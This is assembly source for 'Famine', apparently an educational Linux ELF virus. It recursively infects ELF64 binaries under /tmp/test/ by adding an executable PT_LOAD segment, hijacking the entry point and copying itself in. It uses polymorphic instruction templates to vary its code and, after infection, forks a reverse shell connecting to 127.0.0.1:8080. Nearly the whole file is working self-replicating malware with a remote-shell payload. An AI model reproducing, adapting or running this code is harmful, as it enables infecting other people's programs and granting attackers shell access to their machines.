%include "src/famine.inc"

BITS 64
default rel

section .text
	global _start

; %rdi %rsi %rdx %r10 %r8 %r9

_start:
	PUSH_ALL
	lea		rax, [rel _start]
	lea		rdi, [rel _stop]
	lea		rdx, [rel templates_rdi]
	mov		r8, 7
	mov		r9, 4
	call	polymorph
	lea		rdx, [rel templates_rax]
	call	polymorph
	lea		rdx, [rel templates_rsi]
	call	polymorph
	lea		rdx, [rel templates_rdx]
	call	polymorph
	lea		rdx, [rel templates_rcx]
	call	polymorph
	lea		rdx, [rel templates_r10]
	call	polymorph
	lea		rdx, [rel templates_r11]
	call	polymorph
	lea		rdx, [rel templates_r13]
	call	polymorph
	lea		rdx, [rel templates_r15]
	call	polymorph

	mov		rax, SYS_open
	lea		rdi, [rel self]
	xor		rsi, rsi
	NOP
	NOP
	NOP
	NOP
	xor		rdx, rdx
	NOP
	NOP
	NOP
	NOP
	syscall
	cmp		rax, 0

	jle		.just_quit
	mov		r12, rax

	mov		rax, SYS_pread64
	mov		rdi, r12
	lea		rsi, [rel zero]
	mov		rdx, 1
	mov		r10, 10
	syscall

	.just_quit:
	mov		rax, SYS_close
	mov		rdi, r12
	syscall
	POP_ALL
	mov		al, BYTE [rel zero]	; SI ICI = 0, ca signfiie c'est famine
	test	al, al
	jz		.continue

	mov		rax, SYS_fork
	syscall
	cmp		eax, 0
	jng		.continue_fork

	mov		rax, [rel entry]
	mov		[rel new_entry], rax
	mov		rax, [rel new_entry]
	sub		rax, [rel old_entry]
	lea		rdi, [rel _start]
	sub		rdi, rax
	mov		[rel new_entry], rdi

	jmp		[rel new_entry]

.continue_fork:
	mov		rax, SYS_setsid
	syscall
.continue:
	PUSH_ALL
	jmp		end_

find_eq:
	PUSH_ALLr
	xor		rax, rax
	NOP
	NOP
	NOP
	NOP
	mov		rsi, r15
	mov		rdi, rdx
	mov		r9, rcx
	dec		r9
	mov		rcx, r8

	cmpb:
		mov		r14b, byte [rsi]
		mov		r15b, byte [rdi]
		cmp		r14b, r15b
		jne		.quit_loop

		.skip:
		inc		rsi	;	Le  code
		inc		rdi	;	Les nombres
	loop	cmpb

	inc		rax
	.quit_loop:
	POP_ALLr
	ret



replace:
	PUSH_ALL
	mov		r15, rax
	mov		r14, rdx
	mov		rax, rcx
	mov		rcx, r9
	finding_equal:	; LOOP SUR LE NOMBRE DE R9 NUMBERS DONC MANIERES DE MODIFIER
		call	find_eq
		test	rax, rax
		jnz		.equl
		add		rdx, r8
	loop	finding_equal
	jmp		.ret
	.equl:

	mov		rcx, r8


	PUSH_ALLr
	xor		rax, rax
	NOP
	NOP
	NOP
	NOP
	mov		rdi, urandom_path
	xor		rsi, rsi
	NOP
	NOP
	NOP
	NOP
	mov		rax, SYS_open
	syscall
	mov		r12, rax
	mov		rdi, r12
	lea		rsi, [rel randbuf]
	mov		rdx, 8
	mov		rax, SYS_read
	syscall
	mov		rdi, r12
	mov		rax, SYS_close
	syscall
	mov		rax, [rel randbuf]
	xor		rdx, rdx
	NOP
	NOP
	NOP
	NOP
	mov		rcx, r9
	div		rcx
	mov		rax, rdx
	POP_ALLr
	;lea		rsi, [rel file]
	;call	printf
	; r15 le code
	; r14  les instructions

	imul	r8, rax
	add		r14, r8
	mov		rsi, r14
	mov		rdi, r15

	rep		movsb

	.ret:
	POP_ALL
	ret


; RAX = START, RDI = END, RDX = FUNC ADDR, R8 = LEN, R9 = NUMBER
polymorph:
	PUSH_ALL
	mov		rcx, rdi
	sub		rcx, rax
	sub		rcx, r8

	loop_start:

	call	replace

	inc		rax
	loop	loop_start
	POP_ALL
	ret

print_rax:

    PUSH_ALL
    ; Utilisation d’un buffer sur la pile
    sub     rsp, 64             ; réserver 32 bytes
    lea     rsi, [rsp + 64]     ; rsi = fin du buffer
    mov     rcx, 0              ; compteur de caractères
    mov     rbx, rax            ; backup rax dans rbx

.convert:
    xor     rdx, rdx
	NOP
	NOP
	NOP
	NOP
    mov     rax, rbx
    mov     rdi, 10
    div     rdi                ; rax = rbx / 10, rdx = reste
    dec     rsi
    add     dl, '0'
    mov     [rsi], dl
    mov     rbx, rax
    inc     rcx
    test    rax, rax
    jnz     .convert

    ; Affichage
    mov     rax, 1              ; syscall write
    mov     rdi, 1              ; stdout
    mov     rdx, rcx            ; taille
    syscall


	mov		rax, SYS_write
	mov		rdi, 1
	lea		rsi, [rel newl]
	mov		rdx, 1
	syscall

    add     rsp, 64             ; restaurer la pile
    POP_ALL
    ret

	;   rax = ((value - (base % 0x1000) + 0x0FFF) & ~0x0FFF) + (base % 0x1000)
	align_value:	; rax = value, rdx = base
		; sauvegarder base % 0x1000 dans rcx
		PUSH_ALLr
		and		rdx, 0xFFF        ; rcx = base % 0x1000
		sub		rax, rdx          ; rax = value - (base % 0x1000)
		add		rax, 0x0FFF       ; rax += 0x0FFF
		and		rax, ~0x0FFF      ; rax = align up to next page
		add		rax, rdx          ; rax += (base % 0x1000)
		POP_ALLr
	ret

	printf: ; lea rsi
		push	rax
		push	rcx
		push	rsi
		push	rdi
		push	rdx
		xor		rdx, rdx
		NOP
		NOP
		NOP
		NOP
		.loop:
			lodsb		; al <- [rsi], rsi++
			inc		rdx
			test	al, al
			je		.done
			jmp		.loop
		.done:
			sub		rsi, rdx
			mov		rax, SYS_write
			mov		rdi, 1
			syscall
			mov		rax, SYS_write
			mov		rdi, 1
			lea		rsi, [rel newl]
			mov		rdx, 1
			syscall
		pop		rdx
		pop		rdi
		pop		rsi
		pop		rcx
		pop		rax
	ret

	sub_val:	; lea rsi
		push	rax
		push	rcx
		push	rsi
		push	rdi
		push	rdx
		.loop:
			lodsb		; al <- [rsi], rsi++
			inc		rdx
			test	al, al
			je		.done
			jmp		.loop
		.done:
			cmp		rdx, 3
			jle		.finish
			std		 ; sens inverse pour lodsb
			mov		[rsi - 2], byte 0
			.second_loop:
				lodsb
				cmp		al, '/'
				je		.second_done
				mov		[rsi + 1], byte 0
				jmp		.second_loop
			.second_done:
			cld
		.finish:
		pop		rdx
		pop		rdi
		pop		rsi
		pop		rcx
		pop		rax
	ret

	add_val:	; lea rsi [le path], lea rdi val ajoutee
		push	rax
		push	rcx
		push	rsi
		push	rdi
		push	rdx
		push	r12

		mov		r12, rax
		xor		rcx, rcx
		NOP
		NOP
		NOP
		NOP
		xor		rdx, rdx
		NOP
		NOP
		NOP
		NOP
		.loop:
			lodsb
			test	al, al
			je		.done
			inc		rdx
			jmp		.loop
		.done:
			dec		rsi
			xchg	rsi, rdi
			.second_loop:
				lodsb
				inc		rcx
				test	al, al
				je		.second_done
				jmp		.second_loop
			.second_done:
				sub		rsi, rcx
				mov		rax, rcx
				rep		movsb
				xchg	rsi, rdi

				cmp		r12, 4
				jne		.file
				mov		[rsi - 1], byte '/'
				mov		[rsi], byte 0
				.file:
				sub		rsi, rax
				sub		rsi, rdx
		pop		r12
		pop		rdx
		pop		rdi
		pop		rsi
		pop		rcx
		pop		rax
	ret

	famine:
		push	r12
		push	rax
		push	rcx
		push	rsi
		push	rdi
		push	rdx

		lea		rsi, [rel path]
		call	printf
		lea		rdi, [rel buff]
		mov		rcx, 512
		xor		rax, rax
		NOP
		NOP
		NOP
		NOP
		rep		stosq

		mov		rax, SYS_openat
		mov		rdi, AT_FDCWD
		lea		rsi, [rel path]
		xor		rdx, rdx
		NOP
		NOP
		NOP
		NOP
		xor		r10, r10
		NOP
		NOP
		NOP
		NOP
		syscall
		mov		r12, rax
		mov		rdi, rax
		push	rdi

	;SYS_getdents64
	;struct linux_dirent64 {
    ;ino64_t        d_ino;     // 8 bytes : numéro d'inode
    ;off64_t        d_off;     // 8 bytes : offset du prochain dirent
    ;unsigned short d_reclen;  // 2 bytes : taille de cette entrée
    ;unsigned char  d_type;    // 1 byte  : type de fichier
    ;char           d_name[];  // nom du fichier (null-terminated)
	;};

		mov		rax, SYS_getdents64
		lea		rsi, [rel buff]
		mov		rdx, 4096
		syscall
		mov		rdx, rax
		xor		rdi, rdi
		NOP
		NOP
		NOP
		NOP
		.loop:
			cmp		rdx, rdi
			jle		.done

			add		rdi, 16
			push	rbx
			lea		rbx, [rel buff]
			movzx	rcx, word [rbx + rdi]
			add		rdi, 2
			movzx	rax, byte [rbx + rdi]
			pop		rbx
			add		rdi, 1
			sub		rcx, 19
			add		rdi, rcx
			add		rsi, 19

			cmp		rax, 4
			jne		.file
			push	rsi
			push	rcx
			push	rdi
			mov		rcx, 2
			lea		rdi, [rel curr]
			repe	cmpsb
			pop		rdi
			pop		rcx
			pop		rsi
			je		.no_print
			push	rsi
			push	rcx
			push	rdi
			mov		rcx, 3
			lea		rdi, [rel last]
			repe	cmpsb
			pop		rdi
			pop		rcx
			pop		rsi
			je		.no_print
			; Ici seulement les files


			push	rdi
			push	rsi
			push	rax
			lea		rdi, [rel path]
			xchg	rsi, rdi
			call	add_val
			pop		rax
			pop		rsi
			pop		rdi


			call	famine

			push	rsi
			lea		rsi, [rel path]
			call	sub_val
			pop		rsi

			push	rax
			push	rcx
			push	rsi
			push	rdi
			push	rdx
			lea		rdi, [rel buff]
			mov		rcx, 512
			xor		rax, rax
			NOP
			NOP
			NOP
			NOP
			rep		stosq

			mov		rax, SYS_close
			mov		rdi, r12
			syscall

			mov		rax, SYS_openat
			mov		rdi, AT_FDCWD
			lea		rsi, [rel path]
			xor		rdx, rdx
			NOP
			NOP
			NOP
			NOP
			xor		r10, r10
			NOP
			NOP
			NOP
			NOP
			syscall

			mov		rdi, rax
			mov		rax, SYS_getdents64
			lea		rsi, [rel buff]
			mov		rdx, 4096
			syscall
			pop		rdx
			pop		rdi
			pop		rsi
			pop		rcx
			pop		rax

			jmp		.no_print
		.file:
			;call	printf ;logique des fichier




			push	rdi
			push	rsi
			push	rax
			lea		rdi, [rel path]
			xchg	rsi, rdi
			call	add_val
			pop		rax
			pop		rsi
			pop		rdi

			call	prepare_infection

			; ici logique des fichier
		.no_print:
			add		rsi, rcx
			jmp		.loop
		.done:


		pop		rdi
		mov		rax, SYS_close
		syscall
		pop		rdx
		pop		rdi
		pop		rsi
		pop		rcx
		pop		rax
		pop		r12
	ret

prepare_infection:
	PUSH_ALL

	mov		rax, SYS_open
	lea		rdi, [rel path]
	mov		rsi, 2
	xor		rdx, rdx
	syscall
	mov     r12, rax

	lea		rsi, [rel path]
	call	sub_val

	cmp		rax, 0
	jle		.return
	mov		r12, rax

	; fstat(fd, &stat)
	mov     rdi, r12
	sub     rsp, 144 ; struct stat buffer
	mov     rax, SYS_fstat
	mov     rsi, rsp
	syscall
	cmp     rax, 0
	jl     .close_file

	; mmap(0, size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0)
	mov     rsi, [rsp + 48]
	add rsp, 144
	mov     rax, SYS_mmap
	mov     rdi, 0
	mov     rdx, PROT_READ | PROT_WRITE
	mov     r10, MAP_SHARED
	mov     r8, r12
	mov     r9, 0
	syscall
	cmp     rax, -4095
	jae     .close_file

	mov r14, rax 

	; check is elf
	cmp dword [r14], 0x464c457f
	jne .close_file

	; check is elf64
	cmp byte [r14 + 0x4], 0x2
	jne .close_file

	; check infected
	cmp byte [r14 + 0xa], 0x0
	jne .close_file

	mov		rax, [r14 + 0x18] ; e_entry
	mov		[old_entry], rax

	movzx	rcx, word [r14 + 0x38] ; e_phnum
	movzx	rdi, word [r14 + 0x36] ; e_phentisize
	xor		r11, r11
	NOP
	NOP
	NOP
	NOP
	xor		r10, r10
	NOP
	NOP
	NOP
	NOP

	call	infection

	.close_file:
		mov		rax, SYS_close
		mov		rdi, r12
		syscall
	.return:
		POP_ALL
		ret

;movzx	rcx, e_phnum
;movzx	rdi, e_phentisize
infection:
    PUSH_ALLr

    mov BYTE [rel zero], 1
    mov qword [rel p_offset], 0
    mov qword [rel p_vaddr], 0
    mov qword [rel p_paddr], 0

    mov r10, [r14 + ehdr.e_phoff] ; program header table offset
    movzx rcx, word [r14 + ehdr.e_phnum] ; number of entries
    movzx rdi, word [r14 + ehdr.e_phentsize] ; entry size

    xor r15, r15
    xor r11, r11
    xor r8, r8 ; program header index
    mov r13, 1

.loop:
    push r11
    push rcx

    mov rax, r8
    mul rdi
    add rax, r10
    lea rbx, [r14 + rax] ; rbx = current program header

    pop rcx
    pop r11
    inc r8

    cmp dword [rbx], 1 ; PT_LOAD
    jne .no_load

    mov rax, [rbx + phdr.p_filesz] ; p_filesz
    add rax, [rbx + phdr.p_offset] ; + p_offset
    cmp rax, [rel p_offset]
    jb .no_above
    mov [rel p_offset], rax

.no_above_offset:
    mov rax, [rbx + phdr.p_vaddr] ; p_vaddr
    add rax, [rbx + phdr.p_memsz] ; + p_memsz
    cmp rax, [rel p_vaddr]
    jb .no_above
    mov [rel p_vaddr], rax

.no_above:
    cmp dword [rbx + phdr.p_flags], 6 ; PF_R | PF_W
    jnle .no_load
    mov r15, [rbx + phdr.p_vaddr]
    sub r15, [rbx + phdr.p_offset] ; r15 = p_vaddr - p_offset

.no_load:
    cmp dword [rbx], 0 ; PT_NULL
    je .useless_ph
    cmp dword [rbx], 4 ; PT_NOTE
    je .useless_ph
    cmp dword [rbx], 5 ; PT_SHLIB
    je .useless_ph
    jmp .not_useless_ph

.useless_ph:
    mov rax, r8
    dec rax
    mul rdi
    add rax, r10
    mov r11, rax
    xor r13, r13

.not_useless_ph:
    dec rcx
    jnz .loop


	cmp		r13, 1
	mov		rax, [rel p_vaddr]
	;add		rax, [rel elfb + ehdr.e_shoff]
	;add		rax, r15	-> Tant que ca crash pas on add pas!


	mov		rdx, [rel p_offset]

	call	align_value

	mov		[rel p_vaddr], rax
	mov		[rel entry], rax
	mov		[rel p_paddr], rax

	sub		r11, 56;

	mov		rax, SYS_pwrite64
	mov		rdi, r12
	lea		rsi, [rel new_programheader]
	mov		rdx, 56
	mov		r10, r11
	syscall
	;  LOAD           0x0000000000024770 0x0000000000026770 0x0000000000026770
	; New Entry
	mov		rax, SYS_pwrite64
	mov		rdi, r12
	lea		rsi, [rel p_vaddr]
	mov		rdx, 8
	mov		r10, ehdr.e_entry
	syscall


	mov		rax, SYS_pwrite64
	mov		rdi, r12
	lea		rsi, [rel one]
	mov		rdx, 1
	mov		r10, 0xa
	syscall

	; write famine

	; 15952 ->21088
	lea		rsi, [rel _start]
	mov		rdx, FAMINE_SIZE_NO_BSS
	mov		r10, [rel p_offset]
	mov		rdi, r12
	mov		rax, SYS_pwrite64
	syscall


	.return:
		mov		rax, r13
		POP_ALLr
		ret



end_:

	call	famine

	mov		rax, SYS_open
	lea		rdi, [rel self]
	xor		rsi, rsi
	NOP
	NOP
	NOP
	NOP
	xor		rdx, rdx
	NOP
	NOP
	NOP
	NOP
	syscall

	cmp		rax, 0
	jle		.just_quit
	mov		r12, rax

	mov		rax, SYS_pread64
	mov		rdi, r12
	lea		rsi, [rel zero]
	mov		rdx, 1
	mov		r10, 10
	syscall


	mov		rax, SYS_close
	mov		rdi, r12
	syscall


	.just_quit:
		POP_ALL

		mov		rax, SYS_fork
		syscall

		cmp		eax, 0
		jng		.continue_fork

		mov		rax, SYS_exit
		xor		rdi, rdi
		NOP
		NOP
		NOP
		NOP
		syscall

	.continue_fork:
		mov		rax, SYS_setsid
		syscall

		mov		rax, SYS_socket
		mov		rdi, AF_INET
		mov		rsi, SOCK_STREAM
		xor		rdx, rdx
		NOP
		NOP
		NOP
		NOP
		syscall
		mov		r12, rax

		mov		rax, SYS_connect
		mov		rdi, r12
		lea		rsi, [rel serv_addr]
		mov		rdx, 16
		syscall
		test	rax, rax
		jnz		.exit_ret

		mov		rax, SYS_dup2
		mov		rdi, r12
		mov		rsi, 0
		syscall
		mov		rax, SYS_dup2
		mov		rdi, r12
		mov		rsi, 1
		syscall
		mov		rax, SYS_dup2
		mov		rdi, r12
		mov		rsi, 2
		syscall
		lea		rax, [rel arg0]
		mov		[rel argv], rax
		mov		rax, SYS_execve
		lea		rdi, [rel shell]
		lea		rsi, [rel argv]
		xor		rdx, rdx
		NOP
		NOP
		NOP
		NOP
		syscall

	.exit_ret:
		mov		rax, SYS_close
		mov		rdi, r12
		syscall

		mov		rax, SYS_exit
		xor		rdi, rdi
		NOP
		NOP
		NOP
		NOP
		syscall
_stop:
; -----


	file	db 'elf64 found!', 0
	signature	db 'Famine version 1.0 (c)oded by alexafer-jdecorte', 0
	old_entry		   dq 0
	new_entry		   dq 0
	self	db '/proc/self/exe', 0
	last	db '..', 0
	curr	db '.', 0
	one		db 1
	zero	db 0
	paddi	dq 0
	entry	dq 0
	exec	dd 7
	urandom_path : db '/dev/urandom', 0
	randbuf: dq 0
	serv_addr:
		dw AF_INET
		dw 0x901F			; 8080
		dd 0x0100007F		; 127.0.0.1
		times 8 db 0
		shell:	db '/bin/sh', 0
		arg0:       db "sh", 0
		argv:       dq 0, 0

	templates_rdi:
		db 0x48, 0x31, 0xff, 0x90, 0x90, 0x90, 0x90     ; xor, rdi, rdi
		db 0x48, 0xc7, 0xc7, 0x00, 0x00, 0x00, 0x00     ; mov rdi , 0
		db 0x48, 0x29, 0xff, 0x90, 0x90, 0x90, 0x90     ; sub rdi, rdi
		db 0x48, 0x83, 0xe7, 0x00, 0x90, 0x90, 0x90     ; and rdi, 0
	templates_rax:
		db 0x48, 0x31, 0xc0, 0x90, 0x90, 0x90, 0x90     ; xor rax, rax
		db 0x48, 0xc7, 0xc0, 0x00, 0x00, 0x00, 0x00     ; mov rax, 0
		db 0x48, 0x29, 0xc0, 0x90, 0x90, 0x90, 0x90     ; sub rax, rax
		db 0x48, 0x83, 0xe0, 0x00, 0x90, 0x90, 0x90     ; and rax, 0
	templates_rsi:
		db 0x48, 0x31, 0xf6, 0x90, 0x90, 0x90, 0x90     ; xor rsi, rsi
		db 0x48, 0xc7, 0xc6, 0x00, 0x00, 0x00, 0x00     ; mov rsi, 0
		db 0x48, 0x29, 0xf6, 0x90, 0x90, 0x90, 0x90     ; sub rsi, rsi
		db 0x48, 0x83, 0xe6, 0x00, 0x90, 0x90, 0x90     ; and rsi, 0
	templates_rdx:
		db 0x48, 0x31, 0xd2, 0x90, 0x90, 0x90, 0x90     ; xor rdx, rdx
		db 0x48, 0xc7, 0xc2, 0x00, 0x00, 0x00, 0x00     ; mov rdx, 0
		db 0x48, 0x29, 0xd2, 0x90, 0x90, 0x90, 0x90     ; sub rdx, rdx
		db 0x48, 0x83, 0xe2, 0x00, 0x90, 0x90, 0x90     ; and rdx, 0
	templates_rcx:
		db 0x48, 0x31, 0xc9, 0x90, 0x90, 0x90, 0x90     ; xor rcx, rcx
		db 0x48, 0xc7, 0xc1, 0x00, 0x00, 0x00, 0x00     ; mov rcx, 0
		db 0x48, 0x29, 0xc9, 0x90, 0x90, 0x90, 0x90     ; sub rcx, rcx
		db 0x48, 0x83, 0xe1, 0x00, 0x90, 0x90, 0x90     ; and rcx, 0
	templates_r10:
		db 0x4d, 0x31, 0xd2, 0x90, 0x90, 0x90, 0x90     ; xor r10, r10
		db 0x49, 0xc7, 0xc2, 0x00, 0x00, 0x00, 0x00     ; mov r10, 0
		db 0x4d, 0x29, 0xd2, 0x90, 0x90, 0x90, 0x90     ; sub r10, r10
		db 0x49, 0x83, 0xe2, 0x00, 0x90, 0x90, 0x90     ; and r10, 0
	templates_r11:
		db 0x4d, 0x31, 0xdb, 0x90, 0x90, 0x90, 0x90     ; xor r11, r11
		db 0x49, 0xc7, 0xc3, 0x00, 0x00, 0x00, 0x00     ; mov r11, 0
		db 0x4d, 0x29, 0xdb, 0x90, 0x90, 0x90, 0x90     ; sub r11, r11
		db 0x49, 0x83, 0xe3, 0x00, 0x90, 0x90, 0x90     ; and r11, 0
	templates_r13:
		db 0x4d, 0x31, 0xed, 0x90, 0x90, 0x90, 0x90     ; xor r13, r13
		db 0x49, 0xc7, 0xc5, 0x00, 0x00, 0x00, 0x00     ; mov r13, 0
		db 0x4d, 0x29, 0xed, 0x90, 0x90, 0x90, 0x90     ; sub r13, r13
		db 0x49, 0x83, 0xe5, 0x00, 0x90, 0x90, 0x90     ; and r13, 0
	templates_r15:
		db 0x4d, 0x31, 0xff, 0x90, 0x90, 0x90, 0x90     ; xor r15, r15
		db 0x49, 0xc7, 0xc7, 0x00, 0x00, 0x00, 0x00     ; mov r15, 0
		db 0x4d, 0x29, 0xff, 0x90, 0x90, 0x90, 0x90     ; sub r15, r15
		db 0x49, 0x83, 0xe7, 0x00, 0x90, 0x90, 0x90     ; and r15, 0
; NEW HEADER
new_programheader:
	p_type		dd	1
	p_flags		dd	7
	p_offset	dq	0
	p_vaddr		dq	0
	p_paddr		dq	0
	p_filez		dq	FAMINE_SIZE_NO_BSS
	p_memsz		dq	FAMINE_SIZE
	p_palign	dq	4096
	newl	times 0001 db 0xa
	path	db '/tmp/test/', 0
buffer_bss:
	padd	times 0512 db 0
	buff	times 4096 db 0
	elfp0	times 0056 db 0
	elfp1	times 0056 db 0

end_addr:
